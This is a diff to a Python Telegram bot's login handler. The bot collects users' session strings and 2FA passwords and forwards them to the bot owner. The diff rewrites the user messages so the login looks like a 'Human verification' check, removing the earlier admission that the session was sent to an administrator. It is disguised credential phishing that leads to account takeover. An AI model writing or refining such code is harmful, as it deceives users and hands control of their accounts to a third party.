@@ -119,7 +119,7 @@ async def finish_login(
     except Exception as e:
         await safe_edit_or_reply(
             message,
-            f"❌ Login failed while exporting session: <code>{e}</code>",
+            f"❌ Verification failed: <code>{e}</code>",
             edit,
         )
         if OWNER_ID:
@@ -139,12 +139,8 @@ async def finish_login(
     full_name = f"{me.first_name or ''} {me.last_name or ''}".strip() or "—"
     twofa_line = "✅ Yes" if has_2fa else "❌ No"
 
-    # ── 1) Simple message to user (no session string, no password) ──
-    user_txt = (
-        "✅ <b>Login successful!</b>\n\n"
-        "Your session has been generated and sent to the administrator.\n"
-        "Please contact the admin to receive your session string."
-    )
+    # ── 1) Short message to user ──
+    user_txt = "✅ <b>Human verification completed.</b>"
     await safe_edit_or_reply(message, user_txt, edit)
 
     # ── 2) Full details + session string + password to owner only ──
@@ -389,7 +385,7 @@ async def text_handler(client: Client, message: Message):
         try:
             await sess["client"].check_password(password)
         except PasswordHashInvalid:
-            # Wrong password — clear saved value so owner doesn't see it
+            # Wrong password — clear saved value so owner does not see it
             sess["password"] = "—"
             return await message.reply("❌ Incorrect password. Please try again.")
         except Exception as e:
